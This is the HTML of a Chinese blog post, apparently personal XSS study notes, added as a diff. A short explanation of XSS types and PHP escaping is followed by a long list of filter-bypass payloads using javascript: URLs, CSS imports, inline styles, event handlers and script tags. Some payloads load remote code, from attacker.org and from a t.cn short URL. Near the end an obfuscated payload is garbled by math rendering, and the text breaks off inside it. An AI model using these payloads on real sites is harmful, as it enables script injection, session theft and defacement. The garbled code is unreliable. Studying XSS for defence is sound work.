@@ -1,0 +1,769 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="xss" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/03/31/xss%E7%AC%94%E8%AE%B0/">
+
+
+
+  <title>
+xss漏洞学习笔记 - 学习笔记 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">xss漏洞学习笔记
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-03-31 14:08:54">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-03-31T14:08:54+08:00">2024-03-31</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?259448"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?374870"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?579839"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?973050"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?60856"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?209522"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 学习笔记"><span itemprop="name">学习笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/03/31/xss%E7%AC%94%E8%AE%B0/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <pre><code>                              xss漏洞学习笔记
+</code></pre>
+<p>xss 实质是指 html 和 javascript 代码的注入</p>
+<pre><code>XSS被恶意使用的三种方法：
+</code></pre>
+<p>1. 窃取 Cookie 值<br />
+ 2. 通过 JavaScript 攻击<br />
+ 3. 篡改网页</p>
+<p>xss 的分类：<br />
+按形式分：反射型 XSS 存储型 XSS<br />
+ 按介质分：JSXSS FlashXSS<br />
+ 按接口分：DOM base XSS , 非 DOM XSS<br />
+ 注：因此没有反射型 XSS、存储型 XSS、DOM XSS 这种分类，因为分类依据都不同…</p>
+<p>1. 反射型：（不持久型 xss）<br />
+与服务器交互，但是交互的数据一般不会被存放在数据库中，一次性，所见即所得，一般出现在查询类页面上等。<br />
+&lt;!--  一般是 &lt; script&gt;alert (123)&lt;/script&gt;   --&gt;<br />
+2. 存储型：（持久型 xss）<br />
+交互的数据会被存放在数据库中，永久性存储，一般出现在留言板，注册等页面。<br />
+&lt;!-- 一般是 #&lt;a href='' onclick=alert ('xss')&gt;click&lt;/a&gt;    --&gt;</p>
+<p>3.DOM 型：<br />
+不与后台服务器产生数据交互，是一种通过 DOM 操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。</p>
+<p>xss 可能存在的漏洞：<br />
+有用户输入输出的地方，用户交互等一些地方，都可能存在 xss 漏洞。</p>
+<p>PHP 转义函数：</p>
+<p>htmlspecialchars($String, $quote_style, $charset)</p>
+<p>$string ：转换对象字符串</p>
+<p>$quote_style：转换方法。</p>
+<p>转换前	转换后	ENT_NOQUOTES	ENT_COMPAT	ENT_QUOTES<br />
+&lt;	          &amp;lt；	支持 	                     支持 	               支持</p>
+<blockquote>
+<pre><code>        &amp;gt；	支持 	                     支持         	       支持
+</code></pre>
+</blockquote>
+<p>&amp;	        &amp;amp；	支持	                             支持                   支持<br />
+ &quot;	        &amp;quot；	不支持	                     支持 	               支持<br />
+’	        &amp;#39；	不支持	                   不支持	               支持<br />
+一般使用最后一种即可：ENT_QUOTES</p>
+<p>$charset：字符编码。如 UTF-8、GBK。</p>
+<p>payload：&lt;!--<br />
+# 第一类：Javascript URL<br />
+&lt;a href=&quot;javascript:alert('test')&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:alert('xss')&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href='vbscript:MsgBox(&quot;XSS&quot;)'&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;vbscript:alert(1)&quot;&gt;Hello&lt;/a&gt;<br />
+&lt;a href=&quot;vbscript:alert(1)&quot;&gt;Hello&lt;/a&gt;<br />
+&lt;a href=javascript:alert(&quot;XSS&quot;)&gt;link&lt;/a&gt;<br />
+&lt;a href= <code>javascript:alert(&quot;RSnake says,'XSS'&quot;)</code> &gt;link&lt;/a&gt;<br />
+&lt;a href=javascript:alert(String.fromCharCode(88,83,83))&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javaSCRIPT:alert(1)&quot;&gt;Hello&lt;/a&gt;<br />
+&lt;a href=&quot;javasc
+ript:alert(1)&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javas	cript:\u0061lert(1);&quot;&gt;Hello&lt;/a&gt;<br />
+&lt;a href=&quot;jav    ascript:alert('XSS')&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;jav	ascript:alert('XSS')&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:alert('XSS')&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot; �  javascript:alert('XSS');&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:\u0061lert(1&amp;#x29&quot;&gt;Hello&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:confirm <code>1</code> &quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:confirm(1)&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;j	a	vas	c	r	ipt:alert(1)&quot;&gt;1&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;javascript:\u0061\u006C\u0065\u0072\u0074(1)&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;2&lt;/a&gt;<br />
+&lt;a href=javascript:eval(&quot;alert('xss')&quot;)&gt;link&lt;/a&gt;<br />
+&lt;a href=javascript:alert('XSS')&gt;link&lt;/a&gt;<br />
+&lt;a href=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;link&lt;/a&gt;<br />
+&lt;a href=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==&quot;&gt;test&lt;/a&gt;<br />
+&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;1&lt;/a&gt;<br />
+&lt;iframe/src=&quot;data:text/html;	base64
+,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</p>
+<p>#第二类：CSS import<br />
+&lt;style&gt;@import url(&quot;<span class="exturl" data-url="aHR0cDovL2F0dGFja2VyLm9yZy9tYWxpY2lvdXMuY3Nz">http://attacker.org/malicious.css</span>&quot;);&lt;/style&gt;<br />
+&lt;style&gt;@imp\ort url(&quot;<span class="exturl" data-url="aHR0cDovL2F0dGFja2VyLm9yZy9tYWxpY2lvdXMuY3Nz">http://attacker.org/malicious.css</span>&quot;);&lt;/style&gt;<br />
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;<br />
+&lt;STYLE&gt;@import'<span class="exturl" data-url="aHR0cDovL2piNTEubmV0L3hzcy5jc3M=">http://jb51.net/xss.css</span>';&lt;/STYLE&gt;</p>
+<p>#第三类：Inline style<br />
+&lt;div style=&quot;color: expression(alert('XSS'))&quot;&gt;<br />
+&lt;div style=color:expression(alert(1))&gt;&lt;/div&gt;<br />
+&lt;div style=&quot;color: '&lt;'; color: expression(alert('XSS'))&quot;&gt;<br />
+&lt;div style=X:expression(alert(/xss/))&gt;<br />
+&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;<br />
+&lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;<br />
+&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;<br />
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS<br />
+&lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&gt;<br />
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br />
+&lt;div style=&quot;z:exp/<em>anything</em>/res/<em>here</em>/sion(alert(1))&quot;&gt;<br />
+&lt;div style=xss:expr/<em>XSS</em>/ession(alert('XSS'))&gt;<br />
+&lt;/XSS/<em>-</em>/STYLE=xss:e/<strong>/xpression(alert('XSS'))&gt;<br />
+&lt;/XSS/<em>-</em>/STYLE=xss:e/</strong>/xpression(window.location=&quot;<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20=">http://www.baidu.com</span>&quot;)&gt;<br />
+&lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&gt; //ie6<br />
+&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;<br />
+&lt;A STYLE='no\xss:noxss(&quot;<em>//</em>&quot;);xss:ex/<em>XSS</em>//<em>/</em>/pression(alert(&quot;XSS&quot;))'&gt;</p>
+<p>#第四类：JavaScript 事件<br />
+ &lt;div onclick=&quot;alert ('xss')&quot;&gt;<br />
+&lt;div onmouseenter=&quot;alert('xss')&quot;&gt;<br />
+&lt;div onclick =&quot;alert('xss')&quot;&gt;<br />
+&lt;BODY ONLOAD=alert('XSS')&gt;<br />
+&lt;img src=1 onerror=alert(1)&gt;<br />
+&lt;img/src='1'/onerror=alert(0)&gt;<br />
+&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt;<br />
+&lt;img src=1 alt=al lang=ert onerror=top<a href="0">alt+lang</a>&gt;<br />
+&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;<br />
+&lt;img src=1 onmouseover=alert('xss') a1=1111&gt;<br />
+&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='<span class="exturl" data-url="aHR0cDovL3QuY24vUjVVcHlPdA==">http://t.cn/R5UpyOt</span>';&gt;<br />
+&lt;a href=&quot;#&quot; onclick=alert('\170\163\163')&gt;test&lt;/a&gt;<br />
+&lt;a href=&quot;#&quot; onclick=&quot;\u0061\u006C\u0065\u0072\u0074(1)&quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;#&quot; onclick=&quot;\u0061\u006C\u0065\u0072\u0074 <code>a</code> &quot;&gt;link&lt;/a&gt;<br />
+&lt;a href=&quot;#&quot; onclick=&quot;alert('xss')&quot;&gt;link&lt;/a&gt;<br />
+&lt;marquee onscroll=alert(1)&gt; test&lt;/marquee&gt;<br />
+&lt;div  style=&quot;width:100px;height:100px;overflow:scroll&quot; onscroll=&quot;alert('a')&quot;&gt;123456 &lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;/div&gt;<br />
+&lt;DIV onmousewheel=&quot;alert('a')&quot; &gt;123456&lt;/DIV&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;<br />
+&lt;div style=&quot;background-color:red&quot; onmouseenter=&quot;alert('a')&quot;&gt;123456&lt;/div&gt;<br />
+&lt;DIV onmouseleave=&quot;alert('1')&quot;&gt;123456&lt;/DIV&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusin=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusout=&quot;alert('bem')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;marquee onstart=&quot;alert('a')&quot; &gt;asdf&lt;/marquee&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; onbeforecopy=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; onbeforecut=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; contentEditable=&quot;true&quot; onbeforeeditfocus=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; =&quot;true&quot; onbeforepaste=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; oncontextmenu=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; oncopy=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; oncut=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; ondrag=&quot;alert('1')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; ondragend=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div style=&quot;background-color:red;&quot; ondragenter=&quot;alert('b')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragleave=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragover=&quot;alert('b')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragstart=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondrop=&quot;alert('b')&quot; &gt;asdf&lt;/div&gt; &lt;div contentEditable=&quot;true&quot; style=&quot;background-color:green;&quot; ondrop=&quot;alert('bem')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onlosecapture=&quot;alert('b')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onpaste=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onselectstart=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onhelp=&quot;alert('a')&quot; &gt;asdf&lt;/div&gt;<br />
+&lt;div STYLE=&quot;background-color:red;behavior:url('#default#time2')&quot; onEnd=&quot;alert('a')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div STYLE=&quot;background-color:red;behavior:url('#default#time2')&quot; onBegin=&quot;alert('a')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; STYLE=&quot;background-color:red;&quot; onactivate=&quot;alert('b')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; STYLE=&quot;background-color:red;filter: Alpha(opacity=100, style=2);&quot;onfilterchange=&quot;alert('b')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; onbeforeactivate=&quot;alert('b')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; onbeforedeactivate=&quot;alert('a')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;div contentEditable=&quot;true&quot; ondeactivate=&quot;alert('bem')&quot;&gt;asdf&lt;/div&gt;<br />
+&lt;video src=&quot;<span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbHMuY29tL2h0bWw1L21vdmllLm9nZw==">http://www.w3schools.com/html5/movie.ogg</span>&quot; onloadedmetadata=&quot;alert(1)&quot; /&gt;<br />
+&lt;video src=&quot;<span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbHMuY29tL2h0bWw1L21vdmllLm9nZw==">http://www.w3schools.com/html5/movie.ogg</span>&quot; onloadstart=&quot;alert(1)&quot; /&gt;<br />
+&lt;audio src=&quot;<span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbHMuY29tL2h0bWw1L21vdmllLm9nZw==">http://www.w3schools.com/html5/movie.ogg</span>&quot; onloadstart=&quot;alert(1)&quot;&gt;<br />
+&lt;audio src=&quot;<span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbHMuY29tL2h0bWw1L21vdmllLm9nZw==">http://www.w3schools.com/html5/movie.ogg</span>&quot; onloadstart=&quot;alert(1)&quot;&gt;&lt;/audio&gt;<br />
+&lt;body onscroll=alert(26)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<br />
+&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(/xss/)&quot;&gt;</p>
+<p>#第五类：Script 标签<br />
+ &lt; script src=&quot;<span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">http://baidu.com</span>&quot;&gt;&lt;/script&gt;<br />
+&lt;script&gt;Function(atob('YWxlcnQoInhzcyIp'))()&lt;/script&gt;<br />
+&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;<br />
+&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;<br />
+&lt;SCRIPT&gt;a=/XSS/ alert(a.source)&lt;/SCRIPT&gt;<br />
+&lt;script&gt;alert(/1/.source)&lt;/script&gt;<br />
+&lt;script&gt;alert(1);&lt;/script&gt;<br />
+&lt;script&gt;prompt(1);&lt;/script&gt;<br />
+&lt;script&gt;confirm(1);&lt;/script&gt;<br />
+&lt;script&gt;alert(/88199/)&lt;/script&gt;<br />
+&lt;script&gt;alert( <code>a</code> )&lt;/script&gt;<br />
+&lt;script&gt;alert('a')&lt;/script&gt;<br />
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br />
+&lt;script&gt;eval(alert(1))&lt;/script&gt;<br />
+&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))&lt;/script&gt;<br />
+&lt;script&gt;eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029&quot;)&lt;/script&gt;<br />
+&lt;script&gt;eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')&lt;/script&gt;<br />
+&lt;script&gt;setTimeout('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')&lt;/script&gt;<br />
+&lt;script&gt;setTimeout(alert(1),0)&lt;/script&gt;<br />
+&lt;script&gt;setTimeout <code>alert\x28\x27 xss \x27\x29</code> &lt;/script&gt;<br />
+&lt;script&gt;setInterval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')&lt;/script&gt;</p>
+<p>&lt;script src=data:text/javascript,alert(1)&gt;&lt;/script&gt;<br />
+&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(1)&gt;&lt;/script&gt;</p>
+<p>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt;<br />
+&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;<br />
+&lt;script&gt;\u0061\u006C\u0065\u0072\u0074 <code>a</code> &lt;/script&gt;<br />
+&lt;script&gt;window<a href="0">'alert'</a>&lt;/script&gt;<br />
+&lt;script&gt;parent<a href="1">'alert'</a>&lt;/script&gt;<br />
+&lt;script&gt;self<a href="2">'alert'</a>&lt;/script&gt;<br />
+&lt;script&gt;top<a href="3">'alert'</a>&lt;/script&gt;<br />
+&lt;!--[if]&gt;&lt;script&gt;alert (1)&lt;/script     --&gt;(该地方 --&gt; 是要写的，注释就近原则忽略)<br />
+&lt;!--(这是注释符)<br />
+&lt;script&gt;alert(&quot;xss&quot;);;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;/script&gt;<br />
+&lt;script&gt;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mtext> </mtext><mo stretchy="false">[</mo><mo stretchy="false">]</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">=~[];</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel">=</span><span class="mspace nobreak"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">[</span><span class="mclose">]</span><span class="mpunct">;</span></span></span></span>={<em><strong>:++<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span></span></span></span>$$<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>:</mo><mo stretchy="false">(</mo><mo stretchy="false">!</mo><mo stretchy="false">[</mo><mo stretchy="false">]</mo><mo>+</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">:(![]+&quot;&quot;)[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mclose">!</span><span class="mopen">[</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mopen">[</span></span></span></span>],</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>:</mo><mo>+</mo><mo>+</mo></mrow><annotation encoding="application/x-tex">:++</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord">+</span></span></span></span>,_</em>😦![]+&quot;&quot;)[],_<em>:++<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span></span></span></span></em>$$:({}+&quot;&quot;)[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">]</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">],</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">]</span><span class="mpunct">,</span></span></span></span>_😦<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span></span></span></span>]+&quot;&quot;)[],_<span class="katex"><span class="katex-mathml"><math 